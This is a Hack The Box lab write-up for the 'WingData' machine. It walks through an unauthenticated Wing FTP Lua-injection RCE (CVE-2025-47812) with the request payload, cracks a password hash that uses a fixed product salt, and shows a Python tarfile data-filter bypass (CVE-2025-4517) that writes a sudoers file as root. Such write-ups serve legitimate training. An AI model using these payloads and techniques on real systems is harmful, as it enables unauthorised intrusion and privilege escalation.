# WingData — Hack The Box, Easy, Linux

**TL;DR:** Wing FTP Server 7.4.3 on a vhost falls to the unauthenticated
CVE-2025-47812 null-byte Lua RCE (service account `wingftp`). Its on-disk account
store yields `wacky`'s password — SHA256 with Wing FTP's fixed `"WingFTP"` salt —
reused for SSH and the user flag. `wacky` can `sudo` a root script that extracts a
tarball with `filter="data"` under **Python 3.12.3**, vulnerable to CVE-2025-4517,
so a crafted tar writes `/etc/sudoers.d` as root.

## Recon

```
$ nmap -Pn -p- 10.129.x.x
22/tcp open ssh    OpenSSH 9.2p1 Debian
80/tcp open http   Apache 2.4.66
```

Port 80 redirects the raw IP to `wingdata.htb`. The homepage is a static template,
but its "Client Portal" button names a second vhost:

```html
<a href="http://ftp.wingdata.htb/">Client Portal</a>
```

`ftp.wingdata.htb` returns `Server: Wing FTP Server(Free Edition)`, and the login
page footer pins the version:

```
Wing FTP Server v7.4.3
```

## Foothold — CVE-2025-47812

Wing FTP ≤ 7.4.4 has an unauthenticated RCE. The login handler writes the submitted
`username` into a per-session Lua file. A NUL byte truncates the username for the
validity check (so `anonymous` is accepted with no password) while the full string
is still used to build the session file — letting `]]` close the Lua long-string
and inject code that runs on the next authenticated request. `io.popen` gives
synchronous output straight back in the page, so no callback is needed:

```
POST /loginok.html
username=anonymous%00]]%0dlocal h = io.popen("<cmd>")%0d ... print(r)%0d--&password=

# response sets a UID cookie; then:
GET /dir.html    Cookie: UID=<uid>
```

```
uid=1000(wingftp) gid=1000(wingftp) ...   wingdata
```

Two gotchas: the anonymous account has a **max-concurrent-session cap** (tight
retry loops exhaust it — "too many users logged to this account"; sessions expire on
idle), and the injected command should be base64-wrapped
(`io.popen("echo <b64>|base64 -d|sh")`) with the inner string URL-encoded, or `&`
splits the POST body and base64 `+` decodes to a space.

## Lateral — the account store and a documented salt

`wingftp` cannot read `/home/wacky` (0770) but owns the Wing FTP data:

```
/opt/wftpserver/Data/1/users/wacky.xml
  <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

Plain `sha256(pw)` and the obvious `user+pw` variants all miss. Wing FTP's scheme is
the documented **`SHA256(password + "WingFTP")`** — a fixed product salt — and rockyou
cracks it at once:

```python
sha256(pw + b"WingFTP").hexdigest() == hash   ->   <redacted>
```

Reused for the system account:

```
$ ssh wacky@wingdata
wacky@wingdata:~$ cat user.txt
<user flag redacted>
```

## Root — CVE-2025-4517 (tarfile "data" filter bypass)

```
wacky may run: (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script validates the backup/tag names and extracts with the supposedly-safe
`filter="data"`:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

The tell is the interpreter:

```
$ /usr/local/bin/python3 --version
Python 3.12.3
```

3.12.3 predates the June-2025 fix for CVE-2025-4517. When a path built through a
symlink chain exceeds `PATH_MAX` (4096), `os.path.realpath()` silently stops
resolving symlinks and falls back to string manipulation; the data filter's
containment check then passes while the kernel follows the links out of the staging
directory. The extraction runs as **root**, and `wacky` can drop the tar into the
group-writable `/opt/backup_clients/backups/`.

The archive is 16 long-named-dir/short-symlink pairs, a 254-char escape symlink of
`..×16`, and a final `escape` symlink adding enough `..` to reach `/`; a member
named `escape/etc/sudoers.d/pwn` then resolves to `/etc/sudoers.d/pwn`:

```
$ sudo /usr/local/bin/python3 .../restore_backup_clients.py -b backup_99.tar -r restore_pwn
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn
$ sudo -l
    (ALL) NOPASSWD: ALL
$ sudo /bin/bash -c 'cat /root/root.txt'
<root flag redacted>
```

Match the exploit's staging-path length and depth-to-root (`/opt /backup_clients
/restored_backups /restore_pwn` = 4) to the target rather than the PoC defaults.

## Why it fell
- Wing FTP a patch behind → unauthenticated RCE.
- Passwords stored with a fast hash and a public fixed salt, then reused for SSH.
- A hardened root extractor undone by an out-of-date interpreter: `filter="data"`
  was the right control, but the Python under it wasn't current.

## Things that cost time
- Self-inflicted rate-limiting from retry loops on the exploit — one economical
  command per action and let the anonymous sessions drain.
- Cracking before knowing the scheme; the `"WingFTP"` salt is the whole game.
- Trying to plant an SSH key for `wingftp` whose home `/opt/wingftp` doesn't exist —
  the synchronous `io.popen` oracle was enough.
